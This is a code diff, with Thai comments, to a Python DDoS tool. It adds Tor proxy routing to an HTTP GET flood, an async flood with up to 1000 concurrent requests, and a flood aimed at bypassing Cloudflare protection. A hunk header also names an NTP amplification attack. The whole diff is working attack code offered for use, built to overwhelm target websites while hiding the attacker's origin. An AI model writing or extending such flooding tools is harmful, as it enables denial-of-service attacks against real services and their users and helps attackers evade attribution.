@@ -19,7 +19,7 @@ console = Console()
 
 
 # Layer 7 HTTP Flood (with proxies support)  # สำหรับฟังก์ชัน
-def http_flood(url, duration, proxies=None, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี HTTP Flood พื้นฐาน
+def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False):  # ฟังก์ชันโจมตี HTTP Flood พื้นฐาน
     """Basic HTTP GET flood with proxy support"""  # ของฟังก์ชัน
     try:
         end_time = time.time() + duration  # คำนวณเวลาสิ้นสุดการโจมตี
@@ -30,7 +30,10 @@ def http_flood(url, duration, proxies=None, monitor=None, max_requests=0):  # �
                 break
 
             try:  # ลองส่งคำขอ
-                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม
+                if use_tor:
+                    proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
+                else:
+                    proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม
                 response = session.get(url, headers=get_random_headers(), proxies=proxy, timeout=5)  # ส่ง GET request
                 if monitor:  # ถ้ามี monitor
                     monitor.update_stats(packets=1, bytes_sent=len(response.content) if response.content else 0)  # อัปเดตสถิติ
@@ -43,7 +46,7 @@ def http_flood(url, duration, proxies=None, monitor=None, max_requests=0):  # �
 
 
 # Async Layer 7 Advanced (aiohttp for faster)  # สำหรับฟังก์ชัน
-async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี HTTP Flood แบบ async
+async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False):  # ฟังก์ชันโจมตี HTTP Flood แบบ async
     """Advanced asynchronous HTTP flood"""  # ของฟังก์ชัน
     connector = aiohttp.TCPConnector(limit=1000)  # สร้าง connector ที่จำกัดการเชื่อมต่อ
     async with aiohttp.ClientSession(connector=connector) as session:  # สร้าง session async ด้วย connector
@@ -54,7 +57,10 @@ async def async_http_flood(url, duration, proxies_list, monitor=None, max_reques
             if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                 break
 
-            proxy = random.choice(proxies_list) if proxies_list else None  # เลือกพร็อกซีแบบสุ่ม
+            if use_tor:
+                proxy = CONFIG['TOR_PROXY']
+            else:
+                proxy = random.choice(proxies_list) if proxies_list else None  # เลือกพร็อกซีแบบสุ่ม
             tasks.append(session.get(url, headers=get_random_headers(), proxy=proxy))  # เพิ่ม task
 
             if len(tasks) >= 1000:  # ถ้ามี tasks เยอะ
@@ -217,7 +223,7 @@ def ntp_amplification(target_ip, target_port, duration, monitor=None, max_reques
 
 
 # Cloudflare Bypass Techniques  # สำหรับฟังก์ชัน
-def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี Cloudflare Bypass
+def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False):  # ฟังก์ชันโจมตี Cloudflare Bypass
     """HTTP flood with Cloudflare bypass techniques"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
 
@@ -254,7 +260,10 @@ def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_reque
 
         try:  # ลองส่งคำขอ
             headers = random.choice(bypass_headers)  # เลือก headers แบบสุ่ม
-            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซี
+            if use_tor:
+                proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
+            else:
+                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซี
 
             time.sleep(random.uniform(0.1, 1.0))  # รอแบบสุ่ม 0.1-1.0 วินาที
 
